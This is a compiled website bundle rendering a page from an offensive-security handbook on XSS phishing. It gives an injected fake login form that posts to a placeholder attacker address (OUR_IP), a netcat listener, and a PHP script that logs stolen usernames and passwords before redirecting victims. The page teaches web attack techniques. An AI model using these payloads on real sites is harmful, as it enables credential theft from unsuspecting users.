"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[2561],{5829:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>d,frontMatter:()=>r,metadata:()=>a,toc:()=>h});var i=t(5893),s=t(1151);const r={},o="Phishing",a={id:"offensive-security/xss/attacks/phishing/README",title:"Phishing",description:"Overview",source:"@site/docs/offensive-security/xss/attacks/phishing/README.md",sourceDirName:"offensive-security/xss/attacks/phishing",slug:"/offensive-security/xss/attacks/phishing/",permalink:"/cybersecurity-handbook/offensive-security/xss/attacks/phishing/",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Defacing",permalink:"/cybersecurity-handbook/offensive-security/xss/attacks/defacing/"},next:{title:"Session hijacking",permalink:"/cybersecurity-handbook/offensive-security/xss/attacks/session_hijacking/"}},c={},h=[{value:"Overview",id:"overview",level:2},{value:"Login form injection",id:"login-form-injection",level:2},{value:"Credential stealing",id:"credential-stealing",level:2}];function l(e){const n={code:"code",h1:"h1",h2:"h2",p:"p",pre:"pre",...(0,s.a)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h1,{id:"phishing",children:"Phishing"}),"\n",(0,i.jsx)(n.h2,{id:"overview",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"Phishing attacks usually utilize legitimate-looking information to trick the victims into sending their sensitive information to the attacker."}),"\n",(0,i.jsx)(n.p,{children:"A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server."}),"\n",(0,i.jsx)(n.h2,{id:"login-form-injection",children:"Login form injection"}),"\n",(0,i.jsx)(n.p,{children:"We inject HTML code that displays a login form on the targeted page and sends the login information to a server we are listening on."}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-console",children:'<h3>Please login to continue</h3>\n<form action=http://OUR_IP>\n    <input type="username" name="username" placeholder="Username">\n    <input type="password" name="password" placeholder="Password">\n    <input type="submit" name="submit" value="Login">\n</form>\n'})}),"\n",(0,i.jsxs)(n.p,{children:["We can write this using ",(0,i.jsx)(n.code,{children:"document.write()"})," as a XSS payload, with the minified HTML code into a single line."]}),"\n",(0,i.jsxs)(n.p,{children:["Furthermore, remove any fields that might discourage the user from using our fake login form with ",(0,i.jsx)(n.code,{children:"document.getElementById().remove()"}),"."]}),"\n",(0,i.jsx)(n.h2,{id:"credential-stealing",children:"Credential stealing"}),"\n",(0,i.jsxs)(n.p,{children:["Start a simple ",(0,i.jsx)(n.code,{children:"netcat"})," server to listen on the connection attempts through the fake login form."]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-console",children:"sudo nc -lvnp 80\n"})}),"\n",(0,i.jsx)(n.p,{children:"We can also use a simple script (in this case PHP) that logs the credentials from the HTTP request and then returns the victim to the original page without any injections."}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php\nif (isset($_GET['username']) && isset($_GET['password'])) {\n    $file = fopen(\"creds.txt\", \"a+\");\n    fputs($file, \"Username: {$_GET['username']} | Password: {$_GET['password']}\\n\");\n    header(\"Location: http://SERVER_IP/phishing/index.php\");\n    fclose($file);\n    exit();\n}\n?>\n"})}),"\n",(0,i.jsx)(n.p,{children:"And then start the PHP listening server instead of netcat:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-console",children:"mkdir /tmp/tmpserver\ncd /tmp/tmpserver\nvi index.php #at this step we wrote our index.php file\nsudo php -S 0.0.0.0:80\n"})})]})}function d(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(l,{...e})}):l(e)}},1151:(e,n,t)=>{t.d(n,{Z:()=>a,a:()=>o});var i=t(7294);const s={},r=i.createContext(s);function o(e){const n=i.useContext(r);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),i.createElement(r.Provider,{value:n},e.children)}}}]);